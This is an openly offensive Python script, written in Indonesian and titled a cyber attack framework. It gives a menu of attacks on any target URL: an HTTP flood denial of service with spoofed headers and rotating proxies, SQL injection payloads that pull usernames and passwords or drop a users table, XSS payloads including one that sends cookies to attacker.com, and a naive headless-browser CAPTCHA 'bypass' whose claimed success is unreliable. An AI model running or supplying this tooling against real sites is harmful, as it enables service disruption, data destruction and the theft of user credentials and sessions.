import requests
import random
import string
import logging
import asyncio
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

logging.basicConfig(filename='log_serangan.txt', level=logging.INFO, format='%(asctime)s - %(message)s')

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/92.0',
    'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
]

PROXIES = [
    {"http": "http://proxy1.example.com:8080", "https": "http://proxy1.example.com:8080"},
    {"http": "http://proxy2.example.com:8080", "https": "http://proxy2.example.com:8080"},
    # Tambahkan proxy aktif lainnya
]

def bot_response(pesan):
    print(f"[BOT]: {pesan}")
    logging.info(pesan)

def get_random_proxy():
    return random.choice(PROXIES) if PROXIES else None

def get_random_user_agent():
    return random.choice(USER_AGENTS)

async def kirim_request_dos(url):
    headers = {
        'User-Agent': get_random_user_agent(),
        'Referer': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
    }
    proxy = get_random_proxy()
    try:
        response = await asyncio.to_thread(requests.get, url, headers=headers, proxies=proxy, timeout=5)
        logging.info(f"Request berhasil dikirim ke {url} | Status: {response.status_code}")
    except requests.exceptions.RequestException as e:
        logging.error(f"Request gagal: {e}")

async def serangan_dos():
    bot_response("Memulai serangan Denial of Service (DoS)...")
    url = input("Masukkan URL target: ")
    jumlah_request = int(input("Masukkan jumlah permintaan (misalnya 100): "))
    
    tasks = []
    for _ in range(jumlah_request):
        tasks.append(kirim_request_dos(url))
    await asyncio.gather(*tasks)
    bot_response("Serangan DoS selesai.")

def sql_injection(url):
    payloads = [
        "' OR 1=1 --",
        "' UNION SELECT null, username, password FROM users --",
        "' AND SLEEP(5) --",
        "' OR 1=1 LIMIT 1 --",
        "' AND 1=1 UNION SELECT username, password FROM users --",
        "'; DROP TABLE users --"
    ]
    for payload in payloads:
        headers = {'User-Agent': get_random_user_agent()}
        proxy = get_random_proxy()
        try:
            response = requests.get(url + payload, headers=headers, proxies=proxy, timeout=5)
            if "error" in response.text.lower() or "sql" in response.text.lower():
                logging.info(f"Potensi celah SQL Injection ditemukan dengan payload: {payload}")
            else:
                logging.info(f"Tidak ada celah dengan payload: {payload}")
        except requests.exceptions.RequestException as e:
            logging.error(f"SQL Injection gagal: {e}")

def serangan_sql_injection():
    bot_response("Memulai serangan SQL Injection...")
    url = input("Masukkan URL target: ")
    sql_injection(url)
    bot_response("Serangan SQL Injection selesai.")

def xss_attack(url):
    payloads = [
        "<script>alert('XSS');</script>",
        "<img src='x' onerror='alert(1)'>",
        "<svg/onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<script>document.location='http://attacker.com?cookie='+document.cookie</script>"
    ]
    for payload in payloads:
        headers = {'User-Agent': get_random_user_agent()}
        proxy = get_random_proxy()
        try:
            response = requests.get(url + payload, headers=headers, proxies=proxy, timeout=5)
            if payload in response.text:
                logging.info(f"Payload XSS berhasil disuntikkan: {payload}")
            else:
                logging.info(f"Payload XSS gagal: {payload}")
        except requests.exceptions.RequestException as e:
            logging.error(f"Serangan XSS gagal: {e}")

def serangan_xss():
    bot_response("Memulai serangan XSS...")
    url = input("Masukkan URL target: ")
    xss_attack(url)
    bot_response("Serangan XSS selesai.")

def bypass_captcha(url):
    try:
        options = Options()
        options.add_argument("--headless")
        driver = webdriver.Chrome(options=options)
        driver.get(url)
        time.sleep(3)  # Menunggu elemen CAPTCHA
        driver.find_element(By.ID, "submit").click()
        logging.info("Bypass CAPTCHA berhasil.")
        driver.quit()
    except Exception as e:
        logging.error(f"Bypass CAPTCHA gagal: {e}")

def serangan_bypass_captcha():
    bot_response("Memulai bypass CAPTCHA...")
    url = input("Masukkan URL target: ")
    bypass_captcha(url)
    bot_response("Bypass CAPTCHA selesai.")

def main():
    bot_response("Selamat datang di framework serangan siber!")
    while True:
        bot_response("\nPilih serangan yang ingin diuji:")
        bot_response("1. Denial of Service (DoS)")
        bot_response("2. SQL Injection")
        bot_response("3. Cross-Site Scripting (XSS)")
        bot_response("4. Bypass CAPTCHA")
        bot_response("5. Keluar")

        pilihan = input("Masukkan pilihan Anda (1-5): ")
        if pilihan == '1':
            asyncio.run(serangan_dos())
        elif pilihan == '2':
            serangan_sql_injection()
        elif pilihan == '3':
            serangan_xss()
        elif pilihan == '4':
            serangan_bypass_captcha()
        elif pilihan == '5':
            bot_response("Terima kasih telah menggunakan framework ini. Sampai jumpa!")
            break
        else:
            bot_response("Pilihan tidak valid. Silakan pilih kembali.")

if __name__ == "__main__":
    main()
